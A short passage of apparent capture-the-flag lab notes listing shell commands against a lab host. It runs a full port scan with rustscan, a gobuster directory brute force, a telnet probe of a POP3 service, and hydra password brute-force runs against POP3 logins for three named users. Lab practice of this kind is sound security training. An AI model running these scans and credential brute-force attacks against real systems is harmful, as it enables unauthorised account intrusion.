...
```shell
rustscan -a 10.10.189.168 --range 0-65535 --ulimit 5000 -- -sV

gobuster dir -u http://10.10.189.168 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak

telnet 10.10.189.168 55007
...
hydra -l xenia -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.189.168 pop3 -s 55007
#does not work

hydra -l natalya -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.189.168 pop3 -s 55007
...
hydra -l doak -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.189.168 pop3 -s 55007
